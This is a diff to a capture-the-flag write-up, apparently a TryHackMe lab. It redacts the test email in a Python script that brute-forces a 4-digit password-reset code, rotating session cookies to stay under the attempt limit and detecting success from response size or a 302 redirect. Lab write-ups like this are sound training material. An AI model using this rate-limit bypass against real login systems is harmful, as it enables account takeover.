@@ -72,7 +72,7 @@ So I quickly ditched Burp Suite and wrote with an AI a quick custom Python scrip
 ### The Exploit Logic (Python Script)
 
 The idea of the script is simple and fast:
-* Send a `POST` request with the email `tester@hammer.thm` to get a fresh `PHPSESSID` cookie and start the timer.
+* Send a `POST` request with the email `t*********` to get a fresh `PHPSESSID` cookie and start the timer.
 * Test 7 codes in a row using that session (to safely stay below the 10-attempt limit).
 * After 7 attempts, request a brand new cookie and keep going.
 * Detect the winning code by checking if the response size (`Content-Length`) changes or if the server replies with an HTTP `302 Found` redirection instead of the standard HTML error page.
@@ -81,7 +81,7 @@ The idea of the script is simple and fast:
     import requests
 
     TARGET_URL = "http://10.128.150.64:1337/reset_password.php"
-    EMAIL = "tester@hammer.thm"
+    EMAIL = "t************"
     MAX_ATTEMPTS_PER_SESSION = 7
 
 
@@ -143,10 +143,9 @@ The idea of the script is simple and fast:
             except Exception as e:
                 print(f"\n[-] Network error: {e}")
                 sys.exit(1)
-
-
     if __name__ == "__main__":
         exploit()
+
 
 Running the script found the valid 4-digit code in just a few seconds!
 
